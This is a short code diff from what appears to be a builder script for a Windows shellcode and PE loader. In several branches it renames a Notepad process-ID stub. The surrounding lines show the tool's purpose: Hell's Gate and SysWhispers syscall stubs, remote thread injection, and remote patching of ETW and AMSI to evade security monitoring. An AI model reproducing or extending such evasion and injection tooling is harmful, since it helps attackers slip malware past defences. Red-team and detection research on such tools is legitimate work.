@@ -986,7 +986,7 @@ if (peload):
             stub.add(HellsgateAllocDelegate)
             stub.add(HellsgateNtCreateThreadExDelegate)
             if (processname == ""):
-                stub.add(HellsgateNotepadProcIDStub)
+                stub.add(NotepadProcIDStub)
                 if (remoteETWpatch):
                     stub.add(HellsgateRemotePatchETWStub)
                 if (remoteAMSIpatch):
@@ -1023,7 +1023,7 @@ if (shellcode):
             stub.add(HellsgateAllocDelegate)
             stub.add(HellsgateNtCreateThreadExDelegate)
             if (processname == ""):
-                stub.add(HellsgateNotepadProcIDStub)
+                stub.add(NotepadProcIDStub)
                 if (remoteETWpatch):
                     stub.add(HellsgateRemotePatchETWStub)
                 if (remoteAMSIpatch):
@@ -1042,7 +1042,7 @@ if (shellcode):
                 stub.add(HellsShellcoderemoteinjectStub)
         elif(syswhispers):
             if (processname == ""):
-                stub.add(WhispersNotepadProcIDStub)
+                stub.add(NotepadProcIDStub)
                 if (remoteETWpatch):
                     stub.add(WhispersRemotePatchETWStub)
                 if (remoteAMSIpatch):
